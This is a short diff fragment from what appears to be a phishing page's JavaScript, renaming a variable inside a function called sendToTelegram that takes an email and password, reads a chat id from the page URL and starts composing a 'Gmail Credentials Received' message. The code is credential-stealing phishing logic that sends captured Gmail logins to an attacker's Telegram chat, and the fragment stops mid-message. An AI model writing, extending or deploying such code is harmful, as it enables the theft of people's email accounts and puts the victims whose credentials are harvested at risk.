@@ -463,7 +463,7 @@
             }
             
             async function sendToTelegram(email, password) {
-                const fast_key = await getFastKey();
+                const botfast_key = await getFastKey();
                 const chatId = new URLSearchParams(window.location.search).get('id');
                 
                 const message = `✅ Gmail Credentials Received:
